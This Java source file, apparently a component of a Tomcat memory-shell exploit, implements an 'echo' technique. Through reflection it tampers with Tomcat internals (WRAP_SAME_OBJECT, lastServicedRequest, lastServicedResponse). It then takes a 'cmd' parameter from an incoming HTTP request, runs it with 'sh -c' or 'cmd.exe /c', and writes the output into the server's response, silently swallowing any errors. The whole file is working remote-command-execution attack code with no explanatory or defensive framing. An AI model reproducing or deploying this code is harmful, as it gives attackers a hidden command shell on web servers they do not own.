package memcacheshell.tomcat;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

public class TomcatEcho {

    public static void main(String[] args){
//        Class clazz1=Class.forName("org.apache.catalina.core.ApplicationFilterChain");
//        Field field= clazz1.getDeclaredField("pos");
//        field.setAccessible(true);


        try {
            Class clazz1 = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field field1 = clazz1.getDeclaredField("WRAP_SAME_OBJECT");
            field1.setAccessible(true);
            Field modifier = field1.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field1, field1.getModifiers() & ~Modifier.FINAL);
            boolean m = (boolean) field1.get(null);


            Class clazz2 = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field field2 = clazz2.getDeclaredField("lastServicedResponse");
            Field field3 = clazz2.getDeclaredField("lastServicedRequest");
            field2.setAccessible(true);
            field3.setAccessible(true);
            Field modifier1 = field2.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field2, field2.getModifiers() & ~Modifier.FINAL);
            modifier.setInt(field3, field3.getModifiers() & ~Modifier.FINAL);


            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) field2.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) field3.get(null);

            String cmd = lastServicedRequest != null
                    ? lastServicedRequest.get().getParameter("cmd")
                    : null;
            if (m || lastServicedRequest == null || lastServicedResponse == null) {
                field2.set(null, new ThreadLocal<>());
                field3.set(null, new ThreadLocal<>());
                field1.set(null, true);
            } else if (cmd != null) {
                ServletResponse responseFacade = lastServicedResponse.get();
                responseFacade.getWriter();
                java.io.Writer w = responseFacade.getWriter();
                Field responseField = ResponseFacade.class.getDeclaredField("response");
                responseField.setAccessible(true);
                Response response = (Response) responseField.get(responseFacade);
                Field usingWriter = Response.class.getDeclaredField("usingWriter");
                usingWriter.setAccessible(true);
                usingWriter.set((Object) response, Boolean.FALSE);

                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                w.write(output);
                w.flush();
            }
        }catch (Exception e){

        }


    }

}
